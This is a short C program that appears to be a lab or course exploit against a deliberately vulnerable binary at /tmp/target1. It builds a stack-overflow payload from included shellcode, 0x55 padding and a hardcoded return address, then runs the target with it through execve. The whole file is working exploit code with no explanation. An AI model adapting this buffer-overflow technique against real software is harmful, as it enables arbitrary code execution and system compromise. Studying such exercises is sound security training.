#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

int main(void)
{
	char arg1[277];

	strcpy(arg1, shellcode);
	memset(arg1+strlen(shellcode), 0x55, 276-strlen(shellcode));
	arg1[272] = 0xa4;
	arg1[273] = 0xfb;
	arg1[274] = 0xff;
	arg1[275] = 0xbe;
	arg1[276] = '\0';

	char *args[] = { TARGET, arg1, NULL };
	char *env[] = { NULL };

	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

	return 0;
}
